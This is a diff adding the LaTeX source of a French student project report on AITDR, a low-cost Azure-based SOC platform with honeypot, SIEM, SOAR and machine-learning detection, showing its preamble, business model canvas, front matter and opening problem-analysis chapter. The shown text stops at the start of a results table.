@@ -1,0 +1,1717 @@
+\documentclass[11pt,a4paper]{report}
+
+% ============================================
+% CONFIGURATION GÉNÉRALE
+% ============================================
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{lmodern}
+\usepackage[french]{babel}
+\usepackage[margin=2.5cm, top=3cm, bottom=3cm]{geometry}
+\usepackage{microtype}
+\usepackage{parskip}
+\usepackage{pdflscape}
+\usepackage{adjustbox}
+\usepackage{csquotes}
+\usepackage{xurl}
+\usepackage{graphicx}
+\usepackage{xcolor}
+\usepackage{array}
+\usepackage{longtable}
+\usepackage{tabularx}
+\usepackage{booktabs}
+\usepackage{colortbl}
+\usepackage{float}
+\usepackage{caption}
+\usepackage[colorlinks=true, linkcolor=titleblue, urlcolor=titleblue, citecolor=titleblue]{hyperref}
+\usepackage{bookmark}
+\usepackage{amsmath}
+\usepackage{amssymb}
+\usepackage{tikz}
+\usetikzlibrary{positioning}
+\usepackage{listings}
+\usepackage{mdframed}
+\usepackage{fancyhdr}
+\usepackage{titlesec}
+\usepackage{enumitem}
+\usepackage{lastpage}
+
+\hypersetup{
+  pdftitle={AITDR - Azure Intelligent Threat Detection and Response},
+  pdfauthor={Oussama Gammal},
+  pdfsubject={Rapport de Projet de Fin d'Annee},
+  pdfkeywords={SOC, Azure, SIEM, SOAR, Machine Learning, Cybersecurite, Terraform, Honeypot},
+  pdfcreator={LaTeX}
+}
+\urlstyle{same}
+\emergencystretch=2em
+\clubpenalty=10000
+\widowpenalty=10000
+\displaywidowpenalty=10000
+
+% ============================================
+% COULEURS
+% ============================================
+\definecolor{titleblue}{RGB}{20,60,120}
+\definecolor{tabheader}{RGB}{20,60,120}
+\definecolor{tabrowlight}{RGB}{248,250,252}
+\definecolor{tabrowdark}{RGB}{235,240,245}
+\definecolor{codegray}{RGB}{245,245,245}
+\definecolor{codeframe}{RGB}{210,220,230}
+\definecolor{codeblue}{RGB}{30,100,180}
+\definecolor{codegreen}{RGB}{0,128,0}
+\definecolor{codeorange}{RGB}{200,80,0}
+\definecolor{infobox}{RGB}{230,240,255}
+\definecolor{alertred}{RGB}{180,30,30}
+\definecolor{successbox}{RGB}{230,255,230}
+
+% Couleurs BMC
+\definecolor{cPartners}{RGB}{226,232,240}
+\definecolor{cActivities}{RGB}{207,226,243}
+\definecolor{cResources}{RGB}{207,226,243}
+\definecolor{cValue}{RGB}{255,224,178}
+\definecolor{cRelations}{RGB}{215,238,213}
+\definecolor{cChannels}{RGB}{215,238,213}
+\definecolor{cSegments}{RGB}{232,213,242}
+\definecolor{cCosts}{RGB}{230,230,230}
+\definecolor{cRevenue}{RGB}{230,230,230}
+
+% ============================================
+% TABLEAUX
+% ============================================
+\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}
+\newcolumntype{C}[1]{>{\centering\arraybackslash}p{#1}}
+\newcolumntype{R}[1]{>{\raggedleft\arraybackslash}p{#1}}
+\newcolumntype{Y}{>{\raggedright\arraybackslash}X}
+\newcommand{\theadcell}[1]{\cellcolor{tabheader}\textcolor{white}{\bfseries #1}}
+\newcommand{\rowlight}{\rowcolor{tabrowlight}}
+\newcommand{\rowdark}{\rowcolor{tabrowdark}}
+\renewcommand{\arraystretch}{1.28}
+\setlength{\tabcolsep}{4pt}
+
+% ============================================
+% CODE
+% ============================================
+\lstdefinestyle{commoncode}{
+  backgroundcolor=\color{codegray},
+  basicstyle=\ttfamily\footnotesize,
+  breaklines=true,
+  breakatwhitespace=false,
+  postbreak=\mbox{\textcolor{gray}{$\hookrightarrow$}\space},
+  captionpos=b,
+  frame=single,
+  rulecolor=\color{codeframe},
+  framerule=0.6pt,
+  xleftmargin=0.4em,
+  xrightmargin=0.4em,
+  framexleftmargin=0.4em,
+  framexrightmargin=0.4em,
+  numbers=left,
+  numberstyle=\tiny\color{gray},
+  numbersep=8pt,
+  showstringspaces=false,
+  tabsize=2,
+  columns=fullflexible,
+  keepspaces=true
+}
+\lstdefinestyle{bashstyle}{style=commoncode, language=bash, commentstyle=\color{codegreen}, keywordstyle=\color{codeblue}\bfseries, stringstyle=\color{codeorange}}
+\lstdefinestyle{pythonstyle}{style=commoncode, language=Python, commentstyle=\color{codegreen}\itshape, keywordstyle=\color{codeblue}\bfseries, stringstyle=\color{codeorange}}
+\lstdefinestyle{hclstyle}{style=commoncode, commentstyle=\color{codegreen}\itshape, keywordstyle=\color{codeblue}\bfseries, stringstyle=\color{codeorange}}
+\lstdefinestyle{sqlstyle}{style=commoncode, language=SQL, commentstyle=\color{codegreen}\itshape, keywordstyle=\color{codeblue}\bfseries, stringstyle=\color{codeorange}}
+
+% ============================================
+% BOÎTES ET FIGURES PLACEHOLDER
+% ============================================
+\newmdenv[
+  backgroundcolor=infobox,
+  linecolor=titleblue,
+  linewidth=1.2pt,
+  leftline=true, rightline=false, topline=false, bottomline=false,
+  innerleftmargin=12pt, innerrightmargin=8pt,
+  innertopmargin=6pt, innerbottommargin=6pt
+]{infobox}
+
+\newcommand{\placeholderfigure}[2]{%
+\begin{figure}[H]
+\centering
+\fbox{\begin{minipage}{0.86\textwidth}
+\centering
+\vspace{0.8cm}
+\textbf{[Insérer la Figure #1 ici]}
+\vspace{0.8cm}
+\end{minipage}}
+\caption{#2}
+\label{fig:#1}
+\end{figure}
+}
+
+\newcommand{\manualplaceholderfigure}[2]{%
+\begin{center}
+\fbox{\begin{minipage}{0.86\textwidth}
+\centering
+\vspace{0.8cm}
+\textbf{[Insérer la Figure #1 ici]}
+\vspace{0.8cm}
+\end{minipage}}
+\end{center}
+\addcontentsline{lof}{figure}{Figure #1 : #2}
+}
+
+\newcommand{\code}[1]{\texttt{\small #1}}
+
+% ============================================
+% MISE EN PAGE
+% ============================================
+\pagestyle{fancy}
+\fancyhf{}
+\rhead{\small\bfseries AITDR}
+\lhead{\small \nouppercase{\leftmark}}
+\cfoot{\small Page \thepage\ sur \pageref{LastPage}}
+\setlength{\headheight}{13pt}
+\renewcommand{\headrulewidth}{0.3pt}
+\fancypagestyle{plain}{
+  \fancyhf{}
+  \cfoot{\small Page \thepage\ sur \pageref{LastPage}}
+  \renewcommand{\headrulewidth}{0pt}
+}
+\titleformat{\chapter}[display]
+  {\Large\bfseries\color{titleblue}}
+  {\filright\MakeUppercase{\chaptertitlename}\ \thechapter}
+  {0.4em}
+  {\titlerule[0.6pt]\vspace{0.6em}\filright}
+\titlespacing*{\chapter}{0pt}{8pt}{14pt}
+\titleformat{\section}[block]{\large\bfseries}{\thesection}{0.6em}{}
+\titlespacing*{\section}{0pt}{12pt}{5pt}
+\titleformat{\subsection}[block]{\normalsize\bfseries}{\thesubsection}{0.5em}{}
+\titlespacing*{\subsection}{0pt}{8pt}{3pt}
+\setlist[itemize]{noitemsep, topsep=3pt, leftmargin=1.5em}
+\setlist[enumerate]{noitemsep, topsep=3pt, leftmargin=1.5em}
+\captionsetup{font=small, labelfont=bf}
+
+% ============================================
+% BUSINESS MODEL CANVAS
+% ============================================
+\newcommand{\bmctitle}[1]{{\bfseries\small\color{titleblue} #1}\\[2pt]}
+\newcommand{\AITDRBusinessModelCanvas}{%
+\clearpage
+\begin{landscape}
+\thispagestyle{empty}
+\centering
+\vspace*{-0.2cm}
+\captionsetup{hypcap=false}
+\captionof{figure}{Business Model Canvas de AITDR}
+\label{fig:bmc}
+\vspace{0.15cm}
+\begingroup
+\setlist[itemize]{leftmargin=*, itemsep=1pt, topsep=1pt, parsep=0pt, label=\textbullet}
+\noindent\begin{adjustbox}{max width=0.98\linewidth, max totalheight=0.90\textheight, center}
+\begin{tikzpicture}[font=\fontsize{7.4}{8.5}\selectfont]
+\def\colA{4.1}\def\colB{4.1}\def\colC{5.3}\def\colD{4.1}\def\colE{4.1}
+\def\rowTop{10.4}\def\rowHalf{5.2}\def\rowBottom{4.25}
+\def\xA{0}
+\pgfmathsetmacro{\xB}{\xA+\colA}
+\pgfmathsetmacro{\xC}{\xB+\colB}
+\pgfmathsetmacro{\xD}{\xC+\colC}
+\pgfmathsetmacro{\xE}{\xD+\colD}
+\pgfmathsetmacro{\xEnd}{\xE+\colE}
+\def\yTop{0}
+\pgfmathsetmacro{\yMid}{\yTop-\rowHalf}
+\pgfmathsetmacro{\yBottomRowStart}{\yTop-\rowTop}
+\pgfmathsetmacro{\yEnd}{\yBottomRowStart-\rowBottom}
+\pgfmathsetmacro{\wA}{\colA-0.35}
+\pgfmathsetmacro{\wB}{\colB-0.35}
+\pgfmathsetmacro{\wC}{\colC-0.35}
+\pgfmathsetmacro{\wD}{\colD-0.35}
+\pgfmathsetmacro{\wE}{\colE-0.35}
+\pgfmathsetmacro{\wHalf}{(\xEnd-\xA)/2-0.35}
+\pgfmathsetmacro{\xMidBottom}{\xA+(\xEnd-\xA)/2}
+
+\fill[cPartners] (\xA,\yTop) rectangle (\xB,\yBottomRowStart);
+\draw (\xA,\yTop) rectangle (\xB,\yBottomRowStart);
+\node[anchor=north west, text width=\wA cm, align=left, inner sep=5pt] at (\xA,\yTop) {
+\bmctitle{Partenaires clés}
+\begin{itemize}
+  \item Microsoft Azure.
+  \item Communautés open source : Suricata, DVWA, Sigma, MITRE ATT\&CK.
+  \item Threat Intelligence : AbuseIPDB, Emerging Threats.
+  \item EMSI et établissements d'enseignement.
+  \item Revendeurs, MSSP, Microsoft Partner Network.
+\end{itemize}};
+
+\fill[cActivities] (\xB,\yTop) rectangle (\xC,\yMid);
+\draw (\xB,\yTop) rectangle (\xC,\yMid);
+\node[anchor=north west, text width=\wB cm, align=left, inner sep=5pt] at (\xB,\yTop) {
+\bmctitle{Activités clés}
+\begin{itemize}
+  \item Développement Terraform, Python et Logic Apps.
+  \item Calibration ML : Isolation Forest et DBSCAN.
+  \item Mise à jour des règles KQL/Sigma.
+  \item Support client et veille Threat Intelligence.
+\end{itemize}};
+
+\fill[cResources] (\xB,\yMid) rectangle (\xC,\yBottomRowStart);
+\draw (\xB,\yMid) rectangle (\xC,\yBottomRowStart);
+\node[anchor=north west, text width=\wB cm, align=left, inner sep=5pt] at (\xB,\yMid) {
+\bmctitle{Ressources clés}
+\begin{itemize}
+  \item Infrastructure Azure : Sentinel, Logic Apps, SQL, Key Vault.
+  \item Code Terraform modulaire.
+  \item Jeux de logs collectés par honeypot.
+  \item Compétences cloud, sécurité et data science.
+\end{itemize}};
+
+\fill[cValue] (\xC,\yTop) rectangle (\xD,\yBottomRowStart);
+\draw (\xC,\yTop) rectangle (\xD,\yBottomRowStart);
+\node[anchor=north west, text width=\wC cm, align=left, inner sep=5pt] at (\xC,\yTop) {
+\bmctitle{Proposition de valeur}
+\begin{itemize}
+  \item Pour les entreprises : SOC cloud-native accessible, détection en temps réel, réponse automatisée et coût maîtrisé.
+  \item Pour les MSSP : socle reproductible pour superviser plusieurs clients.
+  \item MTTD réduit à moins de 5 minutes.
+  \item Blocage automatique en moins de 30 secondes.
+  \item Détection d'anomalies par Machine Learning.
+  \item Déploiement reproductible via Terraform.
+\end{itemize}};
+
+\fill[cRelations] (\xD,\yTop) rectangle (\xE,\yMid);
+\draw (\xD,\yTop) rectangle (\xE,\yMid);
+\node[anchor=north west, text width=\wD cm, align=left, inner sep=5pt] at (\xD,\yTop) {
+\bmctitle{Relation client}
+\begin{itemize}
+  \item Documentation self-service.
+  \item Support communautaire.
+  \item Onboarding assisté pour les offres SaaS.
+  \item Formation et support Enterprise/MSSP.
+\end{itemize}};
+
+\fill[cChannels] (\xD,\yMid) rectangle (\xE,\yBottomRowStart);
+\draw (\xD,\yMid) rectangle (\xE,\yBottomRowStart);
+\node[anchor=north west, text width=\wD cm, align=left, inner sep=5pt] at (\xD,\yMid) {
+\bmctitle{Canaux}
+\begin{itemize}
+  \item Dépôt GitHub.
+  \item Portail SaaS.
+  \item Azure Marketplace.
+  \item LinkedIn, webinaires et conférences.
+  \item Partenariats écoles.
+\end{itemize}};
+
+\fill[cSegments] (\xE,\yTop) rectangle (\xEnd,\yBottomRowStart);
+\draw (\xE,\yTop) rectangle (\xEnd,\yBottomRowStart);
+\node[anchor=north west, text width=\wE cm, align=left, inner sep=5pt] at (\xE,\yTop) {
+\bmctitle{Segments clients}
+\begin{itemize}
+  \item PME et startups sans équipe SOC.
+  \item Analystes SOC.
+  \item Administrateurs Azure.
+  \item Équipes DevSecOps.
+  \item MSSP.
+  \item Établissements d'enseignement.
+\end{itemize}};
+
+\fill[cCosts] (\xA,\yBottomRowStart) rectangle (\xMidBottom,\yEnd);
+\draw (\xA,\yBottomRowStart) rectangle (\xMidBottom,\yEnd);
+\node[anchor=north west, text width=\wHalf cm, align=left, inner sep=5pt] at (\xA,\yBottomRowStart) {
+\bmctitle{Structure de coûts}
+\begin{itemize}
+  \item Infrastructure Azure : VMs B2s, Sentinel, SQL Database, stockage.
+  \item Développement et maintenance.
+  \item R\&D ML et règles de détection.
+  \item Marketing, formation, documentation et support.
+\end{itemize}};
+
+\fill[cRevenue] (\xMidBottom,\yBottomRowStart) rectangle (\xEnd,\yEnd);
+\draw (\xMidBottom,\yBottomRowStart) rectangle (\xEnd,\yEnd);
+\node[anchor=north west, text width=\wHalf cm, align=left, inner sep=5pt] at (\xMidBottom,\yBottomRowStart) {
+\bmctitle{Sources de revenus}
+\begin{itemize}
+  \item Freemium open source auto-hébergé.
+  \item Abonnement SaaS : 49--99 USD/mois.
+  \item Licence Enterprise sur devis.
+  \item Formation, certification et consulting.
+\end{itemize}};
+\end{tikzpicture}
+\end{adjustbox}
+\endgroup
+\end{landscape}
+\clearpage}
+
+\begin{document}
+
+% ============================================
+% 1. PAGE DE GARDE
+% ============================================
+\begin{titlepage}
+\thispagestyle{empty}
+\centering
+\vspace*{0.8cm}
+{\Large\bfseries EMSI --- École Marocaine des Sciences de l'Ingénieur}\\[0.2cm]
+{\normalsize Filière : Ingénierie Informatique \& Réseaux (4IIR)}\\[1.2cm]
+
+{\color{titleblue}\rule{\textwidth}{1.8pt}}\\[0.75cm]
+{\Huge\bfseries\color{titleblue} AITDR}\\[0.35cm]
+{\Large\bfseries Azure Intelligent Threat Detection \& Response}\\[0.45cm]
+{\large Plateforme SOC Cloud --- Détection Intelligente et Réponse Automatisée aux Cybermenaces}\\[0.75cm]
+{\color{titleblue}\rule{0.72\textwidth}{0.7pt}}\\[1.0cm]
+
+{\Large\bfseries Rapport de Projet de Fin d'Année}\\[0.35cm]
+{\large\bfseries Promotion 2025 --- 2026}\\[1.5cm]
+
+\begin{mdframed}[
+  backgroundcolor=infobox,
+  linecolor=titleblue,
+  linewidth=0.8pt,
+  roundcorner=4pt,
+  innerleftmargin=18pt,
+  innerrightmargin=18pt,
+  innertopmargin=12pt,
+  innerbottommargin=12pt
+]
+\renewcommand{\arraystretch}{1.25}
+\begin{tabularx}{0.82\textwidth}{@{}L{3.5cm}Y@{}}
+\textbf{Auteur} & Oussama Gammal \\
+\textbf{Encadrant} & [Nom du superviseur] \\
+\textbf{Établissement} & EMSI --- École Marocaine des Sciences de l'Ingénieur \\
+\textbf{Filière} & Ingénierie Informatique \& Réseaux (4IIR) \\
+\textbf{Date} & 16 juin 2026 \\
+\textbf{Version} & Version 1.0 --- Final \\
+\textbf{Budget} & Budget : 100 USD \\
+\end{tabularx}
+\end{mdframed}
+\vfill
+{\color{titleblue}\rule{\textwidth}{0.5pt}}\\[0.25cm]
+{\small Rapport confidentiel --- Usage académique uniquement}
+\end{titlepage}
+
+% ============================================
+% 2. DÉDICACES
+% ============================================
+\chapter*{Dédicaces}
+\addcontentsline{toc}{chapter}{Dédicaces}
+
+À mes parents, pour leur soutien indéfectible, leur patience et leurs encouragements constants tout au long de mon parcours académique. Leur confiance et leurs sacrifices ont constitué une source permanente de motivation.
+
+À mes encadrants, pour leurs précieux conseils, leur disponibilité, leur rigueur scientifique et leur accompagnement durant les différentes étapes de ce projet de fin d'année.
+
+À mes camarades de promotion, pour leur esprit d'équipe, leur entraide, leurs échanges constructifs et les moments partagés durant ces années de formation.
+
+À toutes les personnes qui ont contribué, de près ou de loin, à la réalisation de ce travail, je dédie ce rapport avec reconnaissance et respect.
+
+\begin{flushright}
+\textit{Oussama Gammal}
+\end{flushright}
+
+% ============================================
+% 3. REMERCIEMENTS
+% ============================================
+\chapter*{Remerciements}
+\addcontentsline{toc}{chapter}{Remerciements}
+
+Je tiens à exprimer ma profonde gratitude à mes encadrants pédagogiques pour leur accompagnement, leurs orientations et leurs remarques constructives. Leur suivi a permis de cadrer ce projet et d'en assurer la progression méthodique.
+
+Je remercie également l'\textbf{EMSI --- École Marocaine des Sciences de l'Ingénieur}, ainsi que l'ensemble de l'équipe pédagogique de la filière \textbf{Ingénierie Informatique \& Réseaux}, pour la qualité de la formation dispensée et pour l'environnement d'apprentissage offert.
+
+Mes remerciements s'adressent aussi aux partenaires technologiques, notamment \textbf{Microsoft}, dont l'écosystème Azure et les crédits étudiants ont rendu possible l'expérimentation de la solution dans un contexte budgétaire contraint.
+
+Enfin, je remercie mes camarades de l'équipe projet et de promotion pour leur soutien moral, leurs échanges techniques et leur esprit de collaboration tout au long de cette expérience.
+
+% ============================================
+% 4. RÉSUMÉ
+% ============================================
+\chapter*{Résumé}
+\addcontentsline{toc}{chapter}{Résumé}
+
+Le projet \textbf{AITDR - Azure Intelligent Threat Detection \& Response} consiste à concevoir et déployer une plateforme SOC Cloud destinée à détecter et répondre automatiquement aux cybermenaces. Il s'inscrit dans un contexte où la transformation numérique des organisations marocaines s'accélère, tandis que les attaques automatisées augmentent en fréquence et en complexité. Les solutions SIEM traditionnelles demeurent souvent coûteuses et difficiles à exploiter pour les PME, ce qui crée un besoin fort pour une solution accessible, reproductible et automatisée.
+
+AITDR repose sur une architecture Azure sécurisée de type Hub-and-Spoke, un honeypot DVWA exposé pour la capture d'attaques réelles, un pipeline ETL de collecte et de parsing des logs, Microsoft Sentinel pour la corrélation SIEM, Azure Logic Apps pour la réponse SOAR, ainsi que des modèles de Machine Learning non supervisés pour la détection d'anomalies. L'infrastructure est déployée avec Terraform afin de garantir la reproductibilité et la traçabilité des ressources.
+
+Les résultats obtenus démontrent la faisabilité technique et budgétaire du projet. Le prototype respecte la contrainte de 100 USD et permet de réduire les délais de détection et de réponse grâce à l'automatisation. La solution présente ainsi une valeur opérationnelle pour les organisations disposant de moyens limités, tout en constituant une base évolutive pour des usages professionnels.
+
+\textbf{Mots-clés :} SOC, Azure, SIEM, SOAR, Machine Learning, Cybersécurité, Infrastructure as Code, Terraform, Honeypot.
+
+% ============================================
+% 5. SOMMAIRE
+% ============================================
+\tableofcontents
+
+% ============================================
+% 6. LISTE DES FIGURES
+% ============================================
+\listoffigures
+
+% ============================================
+% 7. LISTE DES TABLEAUX
+% ============================================
+\listoftables
+
+% ============================================
+% 8. LISTE DES ABRÉVIATIONS ET ACRONYMES
+% ============================================
+\chapter*{Liste des abréviations et acronymes}
+\addcontentsline{toc}{chapter}{Liste des abréviations et acronymes}
+\begin{longtable}{|L{3.5cm}|L{11cm}|}
+\caption{Liste des abréviations et acronymes}\\
+\hline
+\theadcell{Abréviation} & \theadcell{Signification} \\
+\hline
+\endfirsthead
+\hline
+\theadcell{Abréviation} & \theadcell{Signification} \\
+\hline
+\endhead
+AMA & Azure Monitor Agent \\ \hline
+ANRT & Agence Nationale de Réglementation des Télécommunications \\ \hline
+APT & Advanced Persistent Threat \\ \hline
+ARM & Azure Resource Manager \\ \hline
+BMC & Business Model Canvas \\ \hline
+CAGR & Compound Annual Growth Rate \\ \hline
+CA & Chiffre d'Affaires \\ \hline
+CF & Charges Fixes \\ \hline
+CMI & Centre Monétique Interbancaire \\ \hline
+CNDP & Commission Nationale de Contrôle de la Protection des Données Personnelles \\ \hline
+CNOMP & Conseil National de l'Ordre des Médecins du Maroc \\ \hline
+CVu & Coût Variable unitaire \\ \hline
+DCR & Data Collection Rule \\ \hline
+DDL & Data Definition Language \\ \hline
+DMZ & Demilitarized Zone \\ \hline
+DVWA & Damn Vulnerable Web Application \\ \hline
+ETL & Extract, Transform, Load \\ \hline
+FQDN & Fully Qualified Domain Name \\ \hline
+HCL & HashiCorp Configuration Language \\ \hline
+IaC & Infrastructure as Code \\ \hline
+IDS & Intrusion Detection System \\ \hline
+IPS & Intrusion Prevention System \\ \hline
+KQL & Kusto Query Language \\ \hline
+MAD & Moroccan Dirham \\ \hline
+MENA & Middle East and North Africa \\ \hline
+ML & Machine Learning \\ \hline
+MTTD & Mean Time To Detect \\ \hline
+MTTC & Mean Time To Contain \\ \hline
+MVP & Minimum Viable Product \\ \hline
+NSG & Network Security Group \\ \hline
+PAYG & Pay-As-You-Go \\ \hline
+PESTEL & Politique, Économique, Social, Technologique, Environnemental, Légal \\ \hline
+PFA & Projet de Fin d'Année \\ \hline
+RBAC & Role-Based Access Control \\ \hline
+RGPD & Règlement Général sur la Protection des Données \\ \hline
+SaaS & Software as a Service \\ \hline
+SAM & Serviceable Addressable Market \\ \hline
+SIEM & Security Information and Event Management \\ \hline
+SLA & Service Level Agreement \\ \hline
+SOAR & Security Orchestration, Automation and Response \\ \hline
+SOC & Security Operations Center \\ \hline
+SQL & Structured Query Language \\ \hline
+SSH & Secure Shell \\ \hline
+STP & Segmentation, Targeting, Positioning \\ \hline
+SWOT & Strengths, Weaknesses, Opportunities, Threats \\ \hline
+TAM & Total Addressable Market \\ \hline
+TLS & Transport Layer Security \\ \hline
+VNet & Virtual Network \\ \hline
+VPN & Virtual Private Network \\ \hline
+\end{longtable}
+
+% ============================================
+% 9. INTRODUCTION GÉNÉRALE
+% ============================================
+\chapter*{Introduction générale}
+\addcontentsline{toc}{chapter}{Introduction générale}
+
+La transformation numérique des organisations marocaines s'accélère sous l'effet de la modernisation des services, de l'adoption du Cloud et de la généralisation des usages numériques. Cette évolution offre de nouvelles opportunités d'innovation, mais elle augmente également la surface d'exposition aux cybermenaces. Les attaques automatisées, les scans massifs, les ransomwares et les tentatives d'intrusion ciblant les services exposés deviennent plus fréquents. Dans ce contexte, les solutions SIEM traditionnelles restent souvent coûteuses, complexes à déployer et difficiles à exploiter pour les organisations disposant de budgets limités.
+
+La problématique centrale du projet est la suivante : \textit{Comment concevoir et déployer une plateforme SOC cloud-native, automatisée et intelligente sur Microsoft Azure, permettant aux organisations de détecter et de répondre aux cybermenaces en temps réel, tout en maîtrisant les coûts d'infrastructure dans un budget contraint de 100 USD ?}
+
+Les objectifs du projet sont : concevoir une infrastructure Azure sécurisée, capturer des attaques via un honeypot, automatiser la collecte des logs, centraliser les événements dans Microsoft Sentinel, automatiser la réponse via Azure Logic Apps, détecter les anomalies par Machine Learning, visualiser les menaces avec Power BI et respecter le budget de 100 USD.
+
+Le rapport est organisé autour des chapitres suivants : présentation du cadre de projet, analyse stratégique et étude de marché, viabilité entrepreneuriale et modèle d'affaires, planification et management de projet, conception de la solution, réalisation technique, puis conclusion générale avec bibliographie et annexes.
+
+% ============================================
+% CHAPITRE 1
+% ============================================
+\chapter{Présentation du cadre de projet (CONTEXTE : exploration du problème et opportunité)}
+
+\section{Contexte général et constat terrain}
+\subsection{La cybersécurité au Maroc : une réalité préoccupante}
+La cybersécurité au Maroc connaît une montée en importance en raison de la digitalisation accélérée de l'économie. Les entreprises, administrations et établissements publics utilisent de plus en plus des services numériques et cloud, ce qui augmente leur exposition aux attaques. Les statistiques retenues dans ce projet indiquent que 70\% des entreprises marocaines ont subi au moins une cyberattaque significative, que 45\% ont été touchées par des ransomwares et que le coût moyen d'une attaque peut atteindre 120 000 MAD. En parallèle, seuls 15\% des organisations disposent d'un SOC et 10\% d'un SIEM, ce qui traduit un écart notable entre le niveau de menace et le niveau de protection.
+
+\subsection{L'essor du Cloud comme levier d'innovation}
+L'adoption massive des plateformes cloud telles que Microsoft Azure, AWS et Google Cloud constitue un levier d'innovation pour les organisations marocaines. Le Cloud offre la scalabilité, la facturation à l'usage, la disponibilité de services managés et l'accès rapide à des technologies avancées. En cybersécurité, il permet de déployer des composants SIEM, SOAR, stockage, supervision et Machine Learning sans investir dans une infrastructure matérielle lourde.
+
+\section{Identification et formulation du problème}
+\subsection{Cartographie des frustrations}
+\begin{table}[H]
+\centering
+\caption{Cartographie des frustrations par segment}
+\label{tab:frustrations}
+\small
+\begin{tabularx}{\textwidth}{|L{3cm}|Y|Y|}
+\hline
+\theadcell{Catégorie} & \theadcell{Frustrations identifiées} & \theadcell{Verbatim représentatif} \\
+\hline
+Responsable Sécurité & Coût élevé des SIEM, manque de visibilité, difficulté à justifier l'investissement. & « Les solutions que nous avons évaluées coûtent plus de 20 000 MAD par mois. » \\ \hline
+Analyste SOC & Surcharge d'alertes, faux positifs, outils peu intégrés. & « Je passe 80\% de mon temps à trier des faux positifs. » \\ \hline
+Développeur DevOps & Sécurité ajoutée tardivement, absence d'intégration CI/CD. & « La sécurité arrive souvent en fin de cycle. » \\ \hline
+Direction Générale & Risque réputationnel, conformité, coût incertain. & « Nous voulons être protégés sans exploser le budget. » \\ \hline
+\end{tabularx}
+\end{table}
+\placeholderfigure{1.1}{Extraits d'entretiens avec les professionnels de la sécurité}
+
+\subsection{Formulation structurée du problème}
+Les organisations marocaines, notamment les PME, sont confrontées à des cybermenaces croissantes, mais ne disposent pas toujours de solutions SOC accessibles, intégrées et automatisées. Le problème central réside dans la difficulté de mettre en place une capacité de détection et de réponse efficace tout en respectant des contraintes budgétaires sévères.
+
+\subsection{Analyse des causes profondes : méthode des 5 Pourquoi}
+\begin{table}[H]
+\centering
+\caption{Analyse des 5 Pourquoi}
+\label{tab:5pourquoi}
+\small
+\begin{tabularx}{\textwidth}{|L{1.5cm}|Y|Y|}
+\hline
+\theadcell{Niveau} & \theadcell{Question/Constat} & \theadcell{Réponse/Cause identifiée} \\
+\hline
+P1 & Pourquoi les organisations n'ont-elles pas de SOC efficace ? & Les solutions existantes sont coûteuses et complexes. \\ \hline
+P2 & Pourquoi sont-elles coûteuses ? & Elles reposent sur des licences, infrastructures et équipes spécialisées. \\ \hline
+P3 & Pourquoi ce modèle est-il inadapté aux PME ? & Les éditeurs ciblent surtout les grands comptes. \\ \hline
+P4 & Pourquoi les alternatives open source restent limitées ? & Elles nécessitent une expertise technique rare. \\ \hline
+P5 & Pourquoi l'expertise est-elle rare ? & Les profils cyber sont encore insuffisants face à la demande. \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Compréhension approfondie de l'utilisateur}
+\subsection{Profils utilisateurs cibles --- méthode QQOQCCP}
+\begin{table}[H]
+\centering
+\caption{Profils QQOQCCP des utilisateurs}
+\label{tab:qqoqccp}
+\scriptsize
+\begin{tabularx}{\textwidth}{|L{2.2cm}|Y|Y|}
+\hline
+\theadcell{Dimension} & \theadcell{Responsable de Sécurité / RSSI} & \theadcell{Analyste SOC} \\
+\hline
+QUI ? & Responsable sécurité d'une PME/ETI marocaine. & Jeune analyste cybersécurité en centre SOC. \\ \hline
+QUOI ? & Besoin de visibilité, reporting et détection. & Besoin d'outils de corrélation et réponse rapide. \\ \hline
+OÙ ? & Casablanca, infrastructures cloud et sites distants. & SOC d'entreprise ou MSSP. \\ \hline
+QUAND ? & En continu, surtout audits et migrations cloud. & En continu, lors des alertes et investigations. \\ \hline
+COMMENT ? & Outils basiques ou audits ponctuels. & SIEM traditionnel, tickets et tableaux de bord. \\ \hline
+COMBIEN ? & Budget sécurité limité. & Temps important consacré aux faux positifs. \\ \hline
+POURQUOI ? & Réduire le risque et répondre à la conformité. & Protéger l'entreprise et réduire la charge opérationnelle. \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Génération et sélection de la solution}
+\subsection{Exploration des pistes de solution}
+\begin{table}[H]
+\centering
+\caption{Matrice d'impact/faisabilité des pistes de solution}
+\label{tab:pistes}
+\small
+\begin{tabularx}{\textwidth}{|L{3.2cm}|Y|L{2cm}|L{2cm}|L{2cm}|}
+\hline
+\theadcell{Piste} & \theadcell{Description} & \theadcell{Impact} & \theadcell{Faisabilité} & \theadcell{Score global} \\
+\hline
+SIEM open source & Déploiement Wazuh/Elastic. & Élevé & Moyenne & 7/10 \\ \hline
+Solution commerciale & Sentinel/Splunk clé en main. & Élevé & Élevée & 6/10 \\ \hline
+AITDR cloud-native & SOC intégré sur Azure. & Très élevé & Élevée & 9/10 \\ \hline
+Externalisation SOC & Recours à un MSSP. & Élevé & Moyenne & 6/10 \\ \hline
+Hybride open source + cloud & Combinaison de briques diverses. & Élevé & Moyenne & 7/10 \\ \hline
+\end{tabularx}
+\end{table}
+
+\subsection{Solution retenue et justification}
+AITDR est une plateforme SOC cloud-native qui combine capture d'attaques, collecte de logs, SIEM, SOAR, Machine Learning et visualisation. La solution est retenue pour quatre raisons : maîtrise des coûts via Azure PAYG, intégration native avec l'écosystème Microsoft, reproductibilité par Terraform et innovation grâce au Machine Learning non supervisé.
+
+\section{Hypothèses de départ}
+\begin{table}[H]
+\centering
+\caption{Hypothèses de départ}
+\label{tab:hypotheses}
+\small
+\begin{tabularx}{\textwidth}{|L{1.5cm}|Y|L{2.8cm}|Y|}
+\hline
+\theadcell{ID} & \theadcell{Hypothèse} & \theadcell{Nature} & \theadcell{Moyen de vérification} \\
+\hline
+H1 & Les organisations marocaines ont besoin de SOC accessibles. & Stratégique & Entretiens, enquête et statistiques. \\ \hline
+H2 & Une solution cloud-native réduit les coûts. & Technique & Simulation budgétaire et prototype. \\ \hline
+H3 & Le SOAR réduit le temps de réponse. & Opérationnelle & Tests d'incidents et métriques MTTC. \\ \hline
+\end{tabularx}
+\end{table}
+
+\section{Validation terrain du besoin}
+\subsection{Méthodologie de collecte}
+La validation repose sur une phase quantitative, à travers une enquête en ligne auprès de responsables IT et RSSI, et une phase qualitative, à travers des entretiens semi-directifs avec des professionnels de la sécurité.
+
+\subsection{Résultats quantitatifs et analyse}
+\begin{table}[H]
+\centering
